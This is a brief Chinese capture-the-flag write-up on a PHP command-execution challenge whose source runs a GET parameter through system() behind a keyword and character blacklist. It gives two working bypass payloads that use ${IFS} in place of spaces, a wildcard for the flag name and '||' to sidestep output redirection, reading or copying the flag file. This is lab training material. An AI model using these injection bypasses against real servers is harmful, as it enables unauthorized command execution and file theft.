# 知识点
${IFS}或者$IFS替换空格
# 思路
源码
```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```
payload
```php
方法一 ?c=nl${IFS}/fla?||
方法二 ?c=cp${IFS}/fla?${IFS}a.txt||
```
![image.png](./images/20231017_2350531496.png)![image.png](./images/20231017_2350541292.png)
